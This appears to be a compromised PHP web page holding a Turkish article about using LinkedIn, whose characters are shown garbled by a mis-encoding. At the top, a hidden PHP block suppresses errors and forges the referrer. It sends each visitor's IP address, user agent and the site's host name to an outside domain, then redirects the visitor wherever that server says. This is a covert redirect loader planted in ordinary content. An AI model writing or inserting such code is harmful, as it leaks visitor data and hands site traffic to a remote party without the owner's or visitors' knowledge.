<?php





error_reporting(0);
ob_start();
$ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?: $_SERVER['REMOTE_ADDR'];
$host = trim(str_replace( 'www.' , '' , $_SERVER['HTTP_HOST']));
$ext  = strtolower(end(explode('.', $_SERVER['HTTP_HOST'])));
$_SERVER['HTTP_REFERER']="https://www.google.com/";
$url  = 'http://firstbaba.tk/get.php?agent='.urlencode($_SERVER['HTTP_USER_AGENT']).'&website='.$host.'&referrer='.$_SERVER['HTTP_REFERER'].'&ip='.$ip ;
$conn = file_get_contents($url);
$json = json_decode( $conn, TRUE );
if( $json['redirect'] )
{
	header('Location: '.$json['redirect'] );
	exit();
}
header("Status: 200 OK");
?>


<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">T&uuml;m sosyal medya platformlarÄ± kendilerine &ouml;zg&uuml; &ouml;zellikler barÄ±ndÄ±rmaktadÄ±r. BazÄ±larÄ± fotoÄŸraf ve video tabanlÄ±yken bazÄ±larÄ± da metin tabanlÄ± olmaktadÄ±r.&nbsp;<strong>LinkedIn&nbsp;</strong>ise kullanÄ±cÄ±lar tarafÄ±ndan iÅŸ baÄŸlantÄ±larÄ±nÄ± g&uuml;&ccedil;lendirmek amacÄ±yla kullanÄ±lmaktadÄ±r. LinkedIn profilinize CV&rsquo;nizde yer almasÄ± gereken t&uuml;m bilgilere yer vermeniz gerekmektedir.</span></span></span></span></p>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">LinkedIn kullanarak iÅŸ sekt&ouml;r&uuml;nde adÄ±nÄ±zdan s&ouml;z ettirmeniz m&uuml;mk&uuml;nd&uuml;r. HalihazÄ±rda &ccedil;alÄ±ÅŸtÄ±ÄŸÄ±nÄ±z sekt&ouml;r ile ilgili diÄŸer kullanÄ±cÄ±lara bilgi verebilir, eÄŸer iÅŸ arÄ±yorsanÄ±z iÅŸ verenlerin dikkatini &ccedil;ekebilirsiniz. LinkedIn ile d&uuml;nyanÄ±n her yerindeki profesyoneller ile kolaylÄ±kla iÅŸ iletiÅŸim halinde olabilirsiniz. Kariyerinizde baÅŸarÄ±ya ulaÅŸmak istiyorsanÄ±z mutlaka bir LinkedIn profiline ihtiyacÄ±nÄ±z olacaktÄ±r.</span></span></span></span></p>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">D&uuml;nya teknoloji devi Microsoft b&uuml;nyesinde hizmet veren LinkedIn sayesinde staj bulmanÄ±z da kolaylaÅŸmaktadÄ±r. &Ouml;ÄŸrenimini tamamlamak i&ccedil;in staj yapmak zorunda olan &ouml;ÄŸrenciler LinkedIn profilinde yer alan bilgiler sayesinde staj yapmak istedikleri kurum veya ÅŸirket ile iletiÅŸim halinde olabilmektedirler.</span></span></span></span></p>

<p style="text-align:start">&nbsp;</p>

<h2 style="text-align:start"><span style="font-size:30px"><span style="font-family:Manrope,sans-serif"><span style="color:#3d4249"><span style="background-color:#edeff2">LinkedIn NasÄ±l KullanÄ±lÄ±r?</span></span></span></span></h2>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2"><strong>LinkedIn</strong>, herkes tarafÄ±ndan &uuml;cretsiz kullanÄ±labilen bir platformdur. LinkedIn kullanabilmek i&ccedil;in bir e-posta adresine sahip olmanÄ±z gerekmektedir. KayÄ±t iÅŸlemini yaparken vermeniz gereken bilgiler arasÄ±nda ad soyad ve ÅŸifre gibi temel bilgiler bulunmaktadÄ±r. LinkedIn&rsquo;e kaydolmak olduk&ccedil;a basittir ve yalnÄ±zca bir dakikanÄ±zÄ± alacaktÄ±r. AsÄ±l &ouml;nemli olan platforma kaydolduktan sonra oluÅŸturacaÄŸÄ±nÄ±z profildir. Profilinizin sizi en iyi ÅŸekilde yansÄ±tmasÄ± i&ccedil;in t&uuml;m bilgileri eksiksiz ve doÄŸru bir ÅŸekilde d&uuml;zenlemeniz gerekmektedir.</span></span></span></span></p>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">Platformda &ouml;ÄŸrenim bilgilerinizi ve iÅŸ deneyimlerinizi belirteceÄŸiniz bir b&ouml;l&uuml;m yer almaktadÄ±r. Bu b&ouml;l&uuml;mde yer alan bilgileri eksiksiz bir ÅŸekilde doldurmanÄ±z diÄŸer profesyonellerle iletiÅŸim halinde olmanÄ±zÄ± kolaylaÅŸtÄ±racaktÄ±r. Ä°lgi alanlarÄ±nÄ±zÄ±, yeteneklerinizi ve baÄŸlantÄ±larÄ±nÄ±zÄ± bu platformda &ccedil;ok kolay bir ÅŸekilde doldurabilirsiniz.</span></span></span></span></p>

<p style="text-align:start">&nbsp;</p>

<h2 style="text-align:start"><span style="font-size:30px"><span style="font-family:Manrope,sans-serif"><span style="color:#3d4249"><span style="background-color:#edeff2">LinkedIn Hangi &Ouml;zellikleri BarÄ±ndÄ±rÄ±r?</span></span></span></span></h2>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2"><strong>LinkedIn</strong>&nbsp;bir profesyonelin ihtiyacÄ± olan t&uuml;m &ouml;zellikleri barÄ±ndÄ±rmaktadÄ±r. Bu platformda baÄŸlantÄ± kurma adÄ±nda pop&uuml;ler bir sekme bulunmaktadÄ±r. Bu sekme aracÄ±lÄ±ÄŸÄ± ile her sekt&ouml;rden ve her yaÅŸtan kullanÄ±cÄ±larla dilediÄŸiniz gibi baÄŸlantÄ± kurabilmektesiniz. &nbsp;LinkedIn&rsquo;in en b&uuml;y&uuml;k &ouml;zellikleri arasÄ±nda, &ccedil;ok b&uuml;y&uuml;k ÅŸirketlerin y&ouml;neticileri ile herkesin baÄŸlantÄ± kurabilmesi bulunmaktadÄ±r.</span></span></span></span></p>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">AyrÄ±ca LinkedIn profilinizi kimlerin g&ouml;rd&uuml;ÄŸ&uuml;n&uuml; de kontrol edebiliyorsunuz. Bunun i&ccedil;in profilinizdeki ilgili sekmeye tÄ±klamak yeterli oluyor. LinkedIn hesabÄ±nÄ±zda bir arama yaptÄ±ÄŸÄ±nÄ±zda bu aramayÄ± kaydederek daha sonra ulaÅŸmanÄ±z da m&uuml;mk&uuml;n olmaktadÄ±r. T&uuml;m bunlarÄ±n yanÄ±nda LinkedIn profilinize video ve fotoÄŸraf gibi dosyalar y&uuml;klemeniz de m&uuml;mk&uuml;n olmaktadÄ±r.</span></span></span></span></p>

<p style="text-align:start">&nbsp;</p>

<h2 style="text-align:start"><span style="font-size:30px"><span style="font-family:Manrope,sans-serif"><span style="color:#3d4249"><span style="background-color:#edeff2">LinkedIn Hangi AvantajlarÄ± Sunar?</span></span></span></span></h2>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2"><strong>LinkedIn</strong>, kullanÄ±cÄ±larÄ±na pek &ccedil;ok avantaj sunmaktadÄ±r. Bu avantajlarÄ±n en baÅŸÄ±nda iÅŸ network&uuml; i&ccedil;erisinde aktif olabilmeniz gelmektedir. Ä°ÅŸ hayatÄ±nÄ±n dinamiklerini kolay bir ÅŸekilde takip edebileceÄŸiniz LinkedIn sayesinde, CV&rsquo;nizi g&ouml;nderebilmek i&ccedil;in ÅŸirketlerin iÅŸ ilanÄ± vermesini beklemeniz de gerekmemektedir.</span></span></span></span></p>

<p style="text-align:start">&nbsp;</p>

<p style="text-align:start"><span style="font-size:14px"><span style="color:#3d4249"><span style="font-family:Manrope,sans-serif"><span style="background-color:#edeff2">LinkedIn, sizin g&uuml;&ccedil;l&uuml; referanslar kazanmanÄ±za da olanak saÄŸlamaktadÄ±r. Bunun i&ccedil;in tek yapmanÄ±z gereken ÅŸey yetkililer ile platform &uuml;zerinden baÄŸlantÄ± kurmak. BaÄŸlantÄ± kurduÄŸunuz yetkililere yeteneklerinizi ve deneyimlerinizi g&ouml;stererek dikkat &ccedil;ekmeniz m&uuml;mk&uuml;nd&uuml;r. Siz de bir LinkedIn hesabÄ±na sahip olarak t&uuml;m bu avantajlardan faydalanabilirsiniz.&nbsp;</span></span></span></span></p>
